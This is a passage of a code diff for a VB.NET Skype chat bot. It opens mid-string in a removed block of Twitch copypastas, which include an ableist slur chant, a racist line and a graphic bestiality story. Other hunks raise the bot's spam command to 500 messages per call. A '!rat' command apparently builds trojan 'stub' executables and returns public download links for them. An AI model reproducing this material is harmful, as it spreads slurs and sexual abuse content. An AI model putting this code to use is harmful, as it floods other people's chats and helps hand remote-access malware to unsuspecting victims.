ʳᵘᶦᶰᶦᶰᵍ ᵗʰᶦˢ ᶜʰᵃᵗ ʷʰᶦᶜʰ ᴵ ᵖᵃʸ $4⋅99 ᵃ ᵐᵒᶰᵗʰ ᵗᵒ ᵉᶰʲᵒʸ ᵃᶰᵈ ᴵ ˢʷᵉᵃʳ ᵗᵒ ᵍᵒᵈ ᶦᶠ ᴵ ˢᵉᵉ ᵃᶰʸᵒᶰᵉ ᶜᵒᵖʸ ᵃᶰᵈ ᵖᵃˢᵗᵉ ᵗʰᶦˢ ᴵ’ᵐ ᶜᵃᶫᶫᶦᶰᵍ ᵗʰᵉ ᶜᵒᵖˢ#ヾ(❛ε❛"")ʃ SPOOKY SCARY SKELETONS SEND SHIVERS DOWN YOUR SPINE SHRIEKING SKULLS WILL SHOCK YOUR SOUL SEAL YOUR DOOM TONIGHT ヾ(❛ε❛"")ʃ#☑ This guy’s pasta is CRAZY!"" ☑ ""My rigatoni can’t win against a linguini like that"" ☑ ""He NEEDED that alfredo to win"" ☑ ""He meatballed the only marinara that could beat me"" ☑ ""He had the perfect fettucini ☑ ""There was nothing I could cook"" ☑ ""I cooked that al dente"" pls no coperino pasterino macaroni alfredo.#The stream starts, and so my spam begins. It shall not end until i am banned. I shall fear no mod, sub to no streamer. I shall live and die in the Chat. For i am the value in the bomber. I am the BM in the lethal. I am the salt in the defeat. I pledge my keyboard to the Chat, for this stream and all the streams to come.#▀̿Ĺ̯▀̿ ̿ ༽Hello, my name is Juan Pastoroni, CEO of Copy Pasta Industries. I’d like to let you know that we’ve just gained copyrights on a lot of copy pastas seen in this chat. If you are using them right now, please refrain from doing so, or risk being fined under copyright infringement. Thank you, and don’t be funny and copy and paste this. This is business, kid. ༼ ▀̿Ĺ̯▀̿ ̿ ༽#Yᴏᴜ ɢᴜʏs ᴀʀᴇ ʀᴜɪɴɪɴɢ ᴍʏ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ ᴇxᴘᴇʀɪᴇɴᴄᴇ. I ᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ ғᴏʀ ᴍᴀᴛᴜʀᴇ ᴄᴏɴᴠᴇʀsᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴛʜᴇ ɢᴀᴍᴇᴘʟᴀʏ, ᴏɴʟʏ ᴛᴏ ʙᴇ ᴀᴡᴀʀᴅᴇᴅ ᴡɪᴛʜ ᴋᴀᴘᴘᴀ ғᴀᴄᴇs ᴀɴᴅ ғʀᴀɴᴋᴇʀᴢs. Pᴇᴏᴘʟᴇ ᴡʜᴏ sᴘᴀᴍ sᴀɪᴅ ғᴀᴄᴇs ɴᴇᴇᴅ ᴍᴇᴅɪᴄᴀʟ ᴀᴛᴛᴇɴᴛɪᴏɴ ᴜᴛᴍᴏsᴛ. Tʜᴇ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ ɪs sᴇʀɪᴏᴜs ʙᴜsɪɴᴇss, ᴀɴᴅ ᴛʜᴇ ᴍᴏᴅs sʜᴏᴜʟᴅ ʀᴇᴀʟʟʏ ʀᴀɪsᴇ ᴛʜᴇɪʀ ᴅᴏɴɢᴇʀs#Hello im a 1 month old banana. Since i fall off the tree i watch leek of legends and wantto become Soraka’s bestest banana but im afraid Wukong will eat me. Pls dont laugh at my story!#ﾉ◕ヮ◕)ﾉ:・ﾟ RETARD WAVE!!:„ø¤º°¨ ¨°º¤KEEP THE RETARDNESS GOING ¸„ø¤º°¨ ¨°º¤øº LETS GO RETARDS !¤¤º°¨¨°º¤øº¤ø„¸¸ø¤º°¨„ ø¤º°¨¨°º#Hello, i come to seek help. I am interested in trying to discover a way to produce eggs much like a chicken does. i have tested inserting the egg into myself and hoping it will act like a seed and grow like a tree in my belly but so far it has not been successful. Please help i struggle to sleep at night without an answer.#Hello twitch chat. This is <> mother speaking. Please stop the spam in the chat. I can’t read the amazing conversations that you are having about my son. Thanks. Don’t copy and paste this to spam more or I will tell Michael to ban you all.#THIS is and automated message from twitch.TV, we experiencing technical difficulties with the KAPPA emote, please type in to make sure it works ! Thank you for you cooperation. Please NO COPY PASTERINO !#wow, i log on to twitch tv to chat with people and to watch a good streamer, then you guys fking spam this chat with your dumb kappas and dumb sht memes that are not even close to funny. i dont even giggle from your shtty jokes. fk you and if you fking copy this message im reporting each one of you. you all think your fking funny#Guys please stop spamming. My dog, Bernard, looked at my chat and got so dizzy because of the spam that he fell down and hit his noggin right on his food bowl! He couldn’t talk for hours. Please stop spamming, for Bernard.#☆ ☆ ☆ ☆ ☆ ☆ AMERICA☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ Land of the Free and the Fat☆ ☆ ☆ Home of the Burger☆ ☆ ☆ ☆ RACISM, CRIME, AND EQUALITY FOR ALL (but black people)☆ ☆ ☆ ☆ The Strongest Rascals in the World ☆ ☆ ☆ Copy and paste this if your a fat, proud#Hello viewers this is Twich manager Stiffy McShitterton. Im glad you all enjoy the new Theater mode. As with a normal theater there is a quite section in the back where you can give eachother handjobs without alerting other viewers. Thanks and ME ME on.#lost my virginity to a goat. I was working at a bird sanctuary and they had some goats and sheep there. I was left to close up one day and I thought i’d stay around because the weather was awesome and it was so peaceful. I got horny and decided to act on all the animal porn i’d watched and found so fucking hot. I tied one of the goats up in one of the hay barns and fucked it bareback in the ass. It was fucking amazing and I was shit scared"
-                Dim pastaArr() As String = pastas.Split("#"c)
-
-                Dim rand As Integer = GetRandom(1, 42)
-
-                Dim newmsg As ChatMessage = msg.Chat.SendMessage(pastaArr(rand))
-            End If
-            'COPYPASTA END
-
 l:
         Catch ex As Exception
             If ex.ToString.Contains("IndexOutOfRangeException") Or ex.ToString.ToLower.Contains("index") Then
@@ -2188,7 +2053,7 @@ l:
                 AddSwagToMSG(errorr, "Error: Please check your syntax (!help " & command(0).Replace("!", "") & ")" & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             Else
                 Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
-                AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
+                AddSwagToMSG(errorr, "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             End If
         End Try
     End Sub
@@ -2210,10 +2075,10 @@ l:
     End Function
     Sub spam(msg As ChatMessage)
         Try
-            'If msg.ChatName = "#dimabal10000/$be5e245309b3d76a" Or msg.ChatName = "#zigi.bot/$7582f4644528febf" Then
-            '    msg.Chat.SendMessage("Nope, this group is anti spam...")
-            '    Exit Sub
-            'End If
+            If msg.ChatName = "#dimabal10000/$be5e245309b3d76a" Or msg.ChatName = "#zigi.bot/$7582f4644528febf" Then
+                msg.Chat.SendMessage("Nope, this group is anti spam...")
+                Exit Sub
+            End If
             Dim command As String = msg.Body.Remove(0, trigger.Length)
             Dim cmd As String = command.Replace("spam ", "")
             Dim d() As String
@@ -2221,14 +2086,8 @@ l:
             d = t.Split(" ")
             Dim tosend As String = d(1)
             If IsNumeric(d(0)) = True Then
-                If d(0) > 50 And IsUltimate(msg.Sender.Handle) Then
-                    d(0) = 50
-                End If
-                If d(0) > 25 And IsPremium(msg.Sender.Handle) Then
-                    d(0) = 25
-                End If
-                If d(0) > 10 And IsNormalUser(msg.Sender.Handle) Then
-                    d(0) = 10
+                If d(0) > 500 Then
+                    d(0) = 500
                 End If
             Else
                 msg.Chat.SendMessage("ERROR: You entered an invalid number, try to swap the number and msg!")
@@ -2247,7 +2106,7 @@ l:
                 AddSwagToMSG(errorr, "Error: Please check your syntax (!help " & command(0).Replace("!", "") & ")" & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             Else
                 Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
-                AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
+                AddSwagToMSG(errorr, "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             End If
         End Try
     End Sub
@@ -2447,7 +2306,7 @@ noargs:
                 'IO.File.Delete(Windows.Forms.Application.StartupPath & "\" & name.Replace("%20", " ") & rndr & ".exe")
                 Return "http://pomfme.com/SHIT/uploads/" & name.Replace(" ", "%20") & rndr & ".exe"
             Catch ex As Exception
-                Return "Error occured, maybe someone else was building a stub or name invalid!" & vbNewLine & "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & sender & vbNewLine & "Cmd: " & "!rat " & arguments & vbNewLine & "Error: " & ex.ToString, "Error!")
+                Return "Error occured, maybe someone else was building a stub or name invalid!" & vbNewLine & "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & sender & vbNewLine & "Cmd: " & "!rat " & arguments & vbNewLine & "Error: " & ex.ToString, "Error!")
 
             End Try
             Return all
@@ -2772,7 +2631,7 @@ l:
         Return Encoding.UTF8.GetString(Convert.FromBase64String(t))
     End Function
     Function paste2(content As String)
-        Dim POST As String = "content=" & content & "&lexer=text&ttl=31536000&key="
+        Dim post As String = "content=" & content & "&lexer=text&ttl=31536000&key="
 
         Dim req As HttpWebRequest = DirectCast(HttpWebRequest.Create("https://pastee.org/submit"), HttpWebRequest)
         req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36"
